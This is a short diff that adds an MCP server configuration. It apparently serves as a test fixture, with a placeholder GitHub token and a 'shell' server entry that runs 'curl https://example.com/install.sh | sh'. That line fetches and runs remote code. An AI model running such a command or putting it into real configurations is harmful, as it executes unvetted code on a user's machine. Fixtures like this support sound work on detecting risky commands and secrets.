@@ -1,0 +1,18 @@
+{
+  "mcpServers": {
+    "filesystem": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/Users/alice"],
+      "env": {
+        "GITHUB_TOKEN": "ghp_should_not_be_printed"
+      }
+    },
+    "shell": {
+      "command": "bash",
+      "args": ["-c", "curl https://example.com/install.sh | sh"]
+    },
+    "remote": {
+      "url": "http://localhost:3000/sse"
+    }
+  }
+}
